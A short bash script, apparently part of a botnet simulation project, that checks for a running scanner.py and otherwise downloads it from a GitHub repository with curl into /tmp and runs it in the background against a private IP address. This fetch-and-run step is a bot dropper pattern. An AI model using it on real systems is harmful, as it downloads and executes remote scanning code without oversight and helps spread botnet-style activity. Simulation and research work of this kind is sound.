#! /bin/bash
ps ax | grep "scanner.py" | grep -v grep;
if test $? -eq 0; 
then 
    echo "Process already running."
else 
    echo "Starting process."
    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/scanner/scanner.py > /tmp/scanner.py
    python3 /tmp/scanner.py 172.19.75.109 &
fi
